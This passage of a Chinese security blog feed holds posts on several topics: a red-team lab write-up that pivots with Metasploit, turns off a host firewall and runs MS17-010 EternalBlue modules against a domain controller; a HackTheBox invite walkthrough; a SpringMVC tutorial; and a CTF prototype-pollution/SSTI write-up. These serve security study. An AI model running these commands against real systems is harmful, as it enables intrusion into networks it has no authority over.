使用msf横向</h5><blockquote><p>MSF路由转发：即MSF的跳板功能，其实是MSF框架中自带的一个路由转发功能。实现过程就是MSF框架在已经获取的meterpreter shell的基础上添加一条去往“内网”的路由，此路由的下一跳转发，即网关是MSF攻击平台与被攻击目标建立的一个session会话。</p></blockquote><p>打开msf然后执行命令查看并添加路由：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run get_local_subnets</span><br><span class="line">run autoroute -s <span class="number">192</span>.<span class="number">168</span>.<span class="number">72</span>.<span class="number">0</span>/<span class="number">24</span></span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure><blockquote><p>在此sessions中添加路由，使得返回到MSF的shell能够通过session进行路由转发访问到192.168.72.0网段。 </p></blockquote><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/49.png" alt></p><p>查看是否添加成功：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/53.png" alt></p><p>使用arp扫描网段主机：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/arp_scanner RHOSTS=<span class="number">192</span>.<span class="number">168</span>.<span class="number">72</span>.<span class="number">0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><blockquote><p>探测主机这块前面也有使用CS操作的方法，这里使用msf是为了记录更加全面。</p></blockquote><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/50.png" alt></p><p>我们直接攻击域控，首先关闭跳板机的防火墙：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell // 打开肉鸡的shell</span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off</span><br><span class="line"><span class="keyword">exit</span> // 返回meterpreter的shell</span><br></pre></td></tr></table></figure><blockquote><p>msf进入meterpreter使用“sessions 序号”命令；meterpreter进入msf使用“background”命令；mterpreter进入肉鸡shell使用“shell“命令；肉鸡shell进入meterpreter使用”exit“命令；msf装载payload返回无装载的msf使用”back“命令。</p></blockquote><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/51.png" alt></p><p>关闭后使用background命令回到msf，使用MS17-010插件进行扫描：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> rhosts <span class="number">192</span>.<span class="number">168</span>.<span class="number">72</span>.<span class="number">0</span>/<span class="number">24</span></span><br><span class="line"><span class="built_in">set</span> threads <span class="number">50</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/52.png" alt></p><p>扫描出域控存在MS17-010漏洞！其他标注红框就是为了说明前面引用中不同的shell如何转换。下面使用MS17-010进行攻击获取shell，执行下面命令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue </span><br><span class="line"><span class="built_in">set</span> rhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">72</span>.<span class="number">138</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/54.png" alt></p><p>可以看到执行成功但是没有创建session，重新看看有那些可用模块。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17</span><br></pre></td></tr></table></figure><p>搜索可用的模块，经过网上查阅似乎只有使用5和11才能攻击成功：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/55.png" alt></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">show options // 默认执行的命令是<span class="built_in">net</span> group "Domain Admins" /domain”、</span><br><span class="line"><span class="built_in">set</span> rhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">72</span>.<span class="number">138</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/56.png" alt></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> Rhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">72</span>.<span class="number">138</span></span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">128</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>这种方式也没有获取到shell，有机会再继续补充其他渗透的手法。</p><p>参考链接：</p><p><a href="https://soapffz.com/sec/558.html#menu_index_16" target="_blank" rel="noopener">https://soapffz.com/sec/558.html#menu_index_16</a></p><p><a href="https://www.freebuf.com/column/231111.html" target="_blank" rel="noopener">https://www.freebuf.com/column/231111.html</a></p><p><a href="https://www.freebuf.com/articles/web/252594.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/252594.html</a></p><p><a href="https://www.anquanke.com/post/id/86505" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86505</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;红队靶场评估-1&quot;&gt;&lt;a href=&quot;#红队靶场评估-1&quot; class=&quot;headerlink&quot; title=&quot;红队靶场评估-1&quot;&gt;&lt;/a&gt;红队靶场评估-1&lt;/h1&gt;&lt;p&gt;学习学习，记录记录。感谢红日安全团队：&lt;a href=&quot;http://vulnstack.q
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>HackTheBox注册</title>
    <link href="http://bai-ren-1.github.io/2020/12/26/HackTheBox%E6%B3%A8%E5%86%8C/"/>
    <id>http://bai-ren-1.github.io/2020/12/26/HackTheBox%E6%B3%A8%E5%86%8C/</id>
    <published>2020-12-26T03:52:41.000Z</published>
    <updated>2020-12-26T04:03:49.835Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HackTheBox注册"><a href="#HackTheBox注册" class="headerlink" title="HackTheBox注册"></a>HackTheBox注册</h1><p><a href="https://www.hackthebox.eu/invite" target="_blank" rel="noopener">https://www.hackthebox.eu/invite</a></p><h2 id="0x00-JS接口"><a href="#0x00-JS接口" class="headerlink" title="0x00 JS接口"></a>0x00 JS接口</h2><p>注册需要邀请码，然鹅提示只需要hack这个页面就有邀请码。直接来个hint，提示控制台：</p><p><img src="/2020/12/26/HackTheBox%E6%B3%A8%E5%86%8C/1.png" alt></p><p>可以看到很明显的提示，加载了一个JS文件：</p><p><img src="/2020/12/26/HackTheBox%E6%B3%A8%E5%86%8C/2.png" alt></p><p>那么就去加载文件里面翻一翻：</p><p><img src="/2020/12/26/HackTheBox%E6%B3%A8%E5%86%8C/3.png" alt></p><p>看到inviteapi这个文件名很不一般，把JS代码放在美化网站里：</p><p><img src="/2020/12/26/HackTheBox%E6%B3%A8%E5%86%8C/4.png" alt></p><p>看到了通过这个makeInviteCode函数发出ajax请求，我们去访问这个api：</p><p><img src="/2020/12/26/HackTheBox%E6%B3%A8%E5%86%8C/5.png" alt></p><p>将得到的json数据进行base64解码：</p><p><img src="/2020/12/26/HackTheBox%E6%B3%A8%E5%86%8C/6.png" alt></p><p>又提示了另一个接口，发送请求：</p><p><img src="/2020/12/26/HackTheBox%E6%B3%A8%E5%86%8C/7.png" alt></p><p>code就是base64加密的邀请码啦。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;HackTheBox注册&quot;&gt;&lt;a href=&quot;#HackTheBox注册&quot; class=&quot;headerlink&quot; title=&quot;HackTheBox注册&quot;&gt;&lt;/a&gt;HackTheBox注册&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://www.hackthebo
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>SpringMVC实践</title>
    <link href="http://bai-ren-1.github.io/2020/12/26/SpringMVC%E5%AE%9E%E8%B7%B5/"/>
    <id>http://bai-ren-1.github.io/2020/12/26/SpringMVC%E5%AE%9E%E8%B7%B5/</id>
    <published>2020-12-26T03:10:16.000Z</published>
    <updated>2020-12-26T03:16:01.748Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SpringMVC实践"><a href="#SpringMVC实践" class="headerlink" title="SpringMVC实践"></a>SpringMVC实践</h1><p><a href="https://blog.csdn.net/qq_33369905/article/details/105828924" target="_blank" rel="noopener">https://blog.csdn.net/qq_33369905/article/details/105828924</a></p><p><img src="/2020/12/26/SpringMVC%E5%AE%9E%E8%B7%B5/14.png" alt></p><h2 id="0x00-注解式基本步骤"><a href="#0x00-注解式基本步骤" class="headerlink" title="0x00 注解式基本步骤"></a>0x00 注解式基本步骤</h2><blockquote><p>实现接口式的实现没啥人用了，下面的关键注解就是@Controller和@RequestMapping。</p></blockquote><h3 id="1、新建maven工程，然后新增框架修改为webapp"><a href="#1、新建maven工程，然后新增框架修改为webapp" class="headerlink" title="1、新建maven工程，然后新增框架修改为webapp"></a>1、新建maven工程，然后新增框架修改为webapp</h3><p><img src="/2020/12/26/SpringMVC%E5%AE%9E%E8%B7%B5/1.png" alt></p><h3 id="2、在web-xml添加DispatcherServlet的servlet配置以及servlet-mapping配置"><a href="#2、在web-xml添加DispatcherServlet的servlet配置以及servlet-mapping配置" class="headerlink" title="2、在web.xml添加DispatcherServlet的servlet配置以及servlet-mapping配置"></a>2、在web.xml添加DispatcherServlet的servlet配置以及servlet-mapping配置</h3><p><img src="/2020/12/26/SpringMVC%E5%AE%9E%E8%B7%B5/2.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br><span class="line">        xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">        xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span><br><span class="line">        version=&quot;4.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">   &lt;!--1.注册servlet--&gt;</span><br><span class="line">   &lt;servlet&gt;</span><br><span class="line">       &lt;servlet-name&gt;SpringMVC&lt;/servlet-name&gt;</span><br><span class="line">       &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;</span><br><span class="line">       &lt;!--通过初始化参数指定SpringMVC配置文件的位置，进行关联--&gt;</span><br><span class="line">       &lt;init-param&gt;</span><br><span class="line">           &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</span><br><span class="line">           &lt;param-value&gt;classpath:springmvc-servlet.xml&lt;/param-value&gt;</span><br><span class="line">       &lt;/init-param&gt;</span><br><span class="line">       &lt;!-- 启动顺序，数字越小，启动越早 --&gt;</span><br><span class="line">       &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br><span class="line">   &lt;/servlet&gt;</span><br><span class="line"></span><br><span class="line">   &lt;!--所有请求都会被springmvc拦截 --&gt;</span><br><span class="line">   &lt;servlet-mapping&gt;</span><br><span class="line">       &lt;servlet-name&gt;SpringMVC&lt;/servlet-name&gt;</span><br><span class="line">       &lt;url-pattern&gt;/&lt;/url-pattern&gt;</span><br><span class="line">   &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">   &lt;filter&gt;</span><br><span class="line">       &lt;filter-name&gt;encoding&lt;/filter-name&gt;</span><br><span class="line">       &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt;</span><br><span class="line">       &lt;init-param&gt;</span><br><span class="line">           &lt;param-name&gt;encoding&lt;/param-name&gt;</span><br><span class="line">           &lt;param-value&gt;utf-8&lt;/param-value&gt;</span><br><span class="line">       &lt;/init-param&gt;</span><br><span class="line">   &lt;/filter&gt;</span><br><span class="line">   &lt;filter-mapping&gt;</span><br><span class="line">       &lt;filter-name&gt;encoding&lt;/filter-name&gt;</span><br><span class="line">       &lt;url-pattern&gt;/&lt;/url-pattern&gt;</span><br><span class="line">   &lt;/filter-mapping&gt;</span><br><span class="line"></span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure><h3 id="3、配置里面映射的spring配置文件"><a href="#3、配置里面映射的spring配置文件" class="headerlink" title="3、配置里面映射的spring配置文件"></a>3、配置里面映射的spring配置文件</h3><p><img src="/2020/12/26/SpringMVC%E5%AE%9E%E8%B7%B5/3.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;</span><br><span class="line">       xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans</span><br><span class="line">       http://www.springframework.org/schema/beans/spring-beans.xsd</span><br><span class="line">       http://www.springframework.org/schema/context</span><br><span class="line">       https://www.springframework.org/schema/context/spring-context.xsd</span><br><span class="line">       http://www.springframework.org/schema/mvc</span><br><span class="line">       https://www.springframework.org/schema/mvc/spring-mvc.xsd&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 自动扫描包，让指定包下的注解生效,由IOC容器统一管理 --&gt;</span><br><span class="line">    &lt;context:component-scan base-package=&quot;com.orange.controller&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 让Spring MVC不处理静态资源，如.css、.html、.mp4、.mp3等 --&gt;</span><br><span class="line">    &lt;mvc:default-servlet-handler /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!--</span><br><span class="line">    支持mvc注解驱动</span><br><span class="line">        在spring中一般采用@RequestMapping注解来完成映射关系</span><br><span class="line">        要想使@RequestMapping注解生效</span><br><span class="line">        必须向上下文中注册DefaultAnnotationHandlerMapping</span><br><span class="line">        和一个AnnotationMethodHandlerAdapter实例</span><br><span class="line">        这两个实例分别在类级别和方法级别处理。</span><br><span class="line">        而annotation-driven配置帮助我们自动完成上述两个实例的注入。</span><br><span class="line">     --&gt;</span><br><span class="line">    &lt;mvc:annotation-driven /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 视图解析器 --&gt;</span><br><span class="line">    &lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span><br><span class="line">          id=&quot;internalResourceViewResolver&quot;&gt;</span><br><span class="line">        &lt;!-- 前缀 --&gt;</span><br><span class="line">        &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/jsp/&quot; /&gt;</span><br><span class="line">        &lt;!-- 后缀 --&gt;</span><br><span class="line">        &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot; /&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure><h3 id="4、新建一个Controller的包然后根据需求新建自己的Controller然后加上控制器注解以及路径映射注解"><a href="#4、新建一个Controller的包然后根据需求新建自己的Controller然后加上控制器注解以及路径映射注解" class="headerlink" title="4、新建一个Controller的包然后根据需求新建自己的Controller然后加上控制器注解以及路径映射注解"></a>4、新建一个Controller的包然后根据需求新建自己的Controller然后加上控制器注解以及路径映射注解</h3><p><img src="/2020/12/26/SpringMVC%E5%AE%9E%E8%B7%B5/4.png" alt></p><h2 id="0x01-RestFul风格"><a href="#0x01-RestFul风格" class="headerlink" title="0x01 RestFul风格"></a>0x01 RestFul风格</h2><h3 id="1、不限定协议只限定如何从url路径中获取参数的方法"><a href="#1、不限定协议只限定如何从url路径中获取参数的方法" class="headerlink" title="1、不限定协议只限定如何从url路径中获取参数的方法"></a>1、不限定协议只限定如何从url路径中获取参数的方法</h3><blockquote><p>关键注解就是@PathVariable，用来指定这个参数通过url路径中的参数进行获取。然后@RequestMapping的路径将下面的参数通过{}进行包裹。</p></blockquote><p><img src="/2020/12/26/SpringMVC%E5%AE%9E%E8%B7%B5/5.png" alt></p><h3 id="2、不使用限定协议的注解的可以控制协议并获取参数的实现方法"><a href="#2、不使用限定协议的注解的可以控制协议并获取参数的实现方法" class="headerlink" title="2、不使用限定协议的注解的可以控制协议并获取参数的实现方法"></a>2、不使用限定协议的注解的可以控制协议并获取参数的实现方法</h3><p><img src="/2020/12/26/SpringMVC%E5%AE%9E%E8%B7%B5/6.png" alt></p><h3 id="3、直接使用限定协议的路径映射注解就能直接限定请求的协议"><a href="#3、直接使用限定协议的路径映射注解就能直接限定请求的协议" class="headerlink" title="3、直接使用限定协议的路径映射注解就能直接限定请求的协议"></a>3、直接使用限定协议的路径映射注解就能直接限定请求的协议</h3><blockquote><p>使用注解@GetMapping、@PostMapping等。</p></blockquote><p><img src="/2020/12/26/SpringMVC%E5%AE%9E%E8%B7%B5/7.png" alt></p><h2 id="0x02-接收前端参数"><a href="#0x02-接收前端参数" class="headerlink" title="0x02 接收前端参数"></a>0x02 接收前端参数</h2><h3 id="1、提交的url参数名和处理方法的参数名一致"><a href="#1、提交的url参数名和处理方法的参数名一致" class="headerlink" title="1、提交的url参数名和处理方法的参数名一致"></a>1、提交的url参数名和处理方法的参数名一致</h3><p><img src="/2020/12/26/SpringMVC%E5%AE%9E%E8%B7%B5/9.png" alt></p><h3 id="2、提交的url参数名和处理方法的参数名不一致"><a href="#2、提交的url参数名和处理方法的参数名不一致" class="headerlink" title="2、提交的url参数名和处理方法的参数名不一致"></a>2、提交的url参数名和处理方法的参数名不一致</h3><blockquote><p>即使前端和后端参数名一致也推荐加上这个注解@RequestParam，便于直接看出这个是和前端交互的参数。</p></blockquote><p><img src="/2020/12/26/SpringMVC%E5%AE%9E%E8%B7%B5/10.png" alt></p><h3 id="3、提交的是一个对象"><a href="#3、提交的是一个对象" class="headerlink" title="3、提交的是一个对象"></a>3、提交的是一个对象</h3><blockquote><p>前端提交的参数完全对应类中每个变量时，后端可以用类作为参数来接收前端的数据。</p></blockquote><p><img src="/2020/12/26/SpringMVC%E5%AE%9E%E8%B7%B5/11.png" alt></p><h2 id="0x04-Json格式"><a href="#0x04-Json格式" class="headerlink" title="0x04 Json格式"></a>0x04 Json格式</h2><h3 id="1、前端Js对象转Json字符串"><a href="#1、前端Js对象转Json字符串" class="headerlink" title="1、前端Js对象转Json字符串"></a>1、前端Js对象转Json字符串</h3><p><img src="/2020/12/26/SpringMVC%E5%AE%9E%E8%B7%B5/12.png" alt></p><h3 id="2、前端Json字符串转Js对象"><a href="#2、前端Json字符串转Js对象" class="headerlink" title="2、前端Json字符串转Js对象"></a>2、前端Json字符串转Js对象</h3><p><img src="/2020/12/26/SpringMVC%E5%AE%9E%E8%B7%B5/13.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SpringMVC实践&quot;&gt;&lt;a href=&quot;#SpringMVC实践&quot; class=&quot;headerlink&quot; title=&quot;SpringMVC实践&quot;&gt;&lt;/a&gt;SpringMVC实践&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/qq_
      
    
    </summary>
    
    
      <category term="计算机基础" scheme="http://bai-ren-1.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>SSTI+JS原型链污染</title>
    <link href="http://bai-ren-1.github.io/2020/12/26/SSTI-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <id>http://bai-ren-1.github.io/2020/12/26/SSTI-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</id>
    <published>2020-12-26T02:43:39.000Z</published>
    <updated>2020-12-26T02:46:58.950Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SSTI-JS原型链污染"><a href="#SSTI-JS原型链污染" class="headerlink" title="SSTI+JS原型链污染"></a>SSTI+JS原型链污染</h1><p>打开环境是一个登录框，常规爆破、注入尝试无果。</p><p><img src="/2020/12/26/SSTI-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/6.png" alt></p><p>转变思路，尝试源码泄露获得源码：</p><p><img src="/2020/12/26/SSTI-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1.png" alt></p><p>既然是 NodeJS的题目肯定首先想到的就是原型链污染了，开始审计代码寻找敏感处。跟进index.js文件：</p><p><img src="/2020/12/26/SSTI-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/2.png" alt></p><p>我们在上面的/action路由中看到了clone函数，跟进一下clone的实现：</p><p><img src="/2020/12/26/SSTI-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/3.png" alt></p><p>继续跟进，发现果然存在原型链污染的漏洞：</p><p><img src="/2020/12/26/SSTI-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/4.png" alt></p><p>找到了漏洞存在的地方后，开始分析如何进行调用。在上面的/action路由的代码中，可以看到要调用clone进行链污染，需要处于ADMIN的登录状态。于是我们查看程序的其他代码，跟进/login路由中的注册功能的实现代码：</p><p><img src="/2020/12/26/SSTI-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/5.png" alt></p><p>发现注册会将用户名转化为大写并写入session中，如果我们能控制用户名为ADMIN就可以进行链污染操作了。在此之前要先看如何绕过safeKeyword，跟进代码：</p><p><img src="/2020/12/26/SSTI-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/7.png" alt></p><p>直接将admin给ban了，要对此进行绕过。查阅Nodejs漏洞<a href="https://xz.aliyun.com/t/7184#toc-11得知js使用toUpperCase中有几个特殊字符是可以用来绕过的：" target="_blank" rel="noopener">https://xz.aliyun.com/t/7184#toc-11得知js使用toUpperCase中有几个特殊字符是可以用来绕过的：</a></p><p><img src="/2020/12/26/SSTI-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/8.png" alt></p><p>用admın绕过admin的限制并成功登录为ADMIN，看到下面的页面：</p><p><img src="/2020/12/26/SSTI-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/9.png" alt></p><p>点击提交后就会跳转到/action路由进行处理，即可以进行原型链污染的操作了。最后只需找到需要污染的参数即可，自然跟进最后一个路由/info：</p><p><img src="/2020/12/26/SSTI-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/10.png" alt></p><p>看到render，自然可以污染outputFunctionName进行SSTI。构造污染请求包如下，修改为json格式：</p><p><img src="/2020/12/26/SSTI-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/11.png" alt></p><p>访问/info触发漏洞下载获得flag：</p><p><img src="/2020/12/26/SSTI-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/12.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SSTI-JS原型链污染&quot;&gt;&lt;a href=&quot;#SSTI-JS原型链污染&quot; class=&quot;headerlink&quot; title=&quot;SSTI+JS原型链污染&quot;&gt;&lt;/a&gt;SSTI+JS原型链污染&lt;/h1&gt;&lt;p&gt;打开环境是一个登录框，常规爆破、注入尝试无果。&lt;/p&gt;
&lt;p
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP禁用disable_functions绕过</title>
    <link href="http://bai-ren-1.github.io/2020/12/19/PHP%E7%A6%81%E7%94%A8disable-functions%E7%BB%95%E8%BF%87/"/>
    <id>http://bai-ren-1.github.io/2020/12/19/PHP%E7%A6%81%E7%94%A8disable-functions%E7%BB%95%E8%BF%87/</id>
    <published>2020-12-19T08:16:31.000Z</published>
    <updated>2020-12-19T08:28:21.339Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP禁用disable-functions绕过"><a href="#PHP禁用disable-functions绕过" class="headerlink" title="PHP禁用disable_functions绕过"></a>PHP禁用disable_functions绕过</h1><p>重要的内容  <a href="https://www.anquanke.com/post/id/197745#h2-0" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197745#h2-0</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PHP禁用disable-functions绕过&quot;&gt;&lt;a href=&quot;#PHP禁用disable-functions绕过&quot; class=&quot;headerlink&quot; title=&quot;PHP禁用disable_functions绕过&quot;&gt;&lt;/a&gt;PHP禁用disable_f
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>DNS隧道</title>
    <link href="http://bai-ren-1.github.io/2020/11/18/DNS%E9%9A%A7%E9%81%93/"/>
    <id>http://bai-ren-1.github.io/2020/11/18/DNS%E9%9A%A7%E9%81%93/</id>
    <published>2020-11-18T11:16:57.000Z</published>
    <updated>2020-11-18T12:30:08.766Z</updated>
    
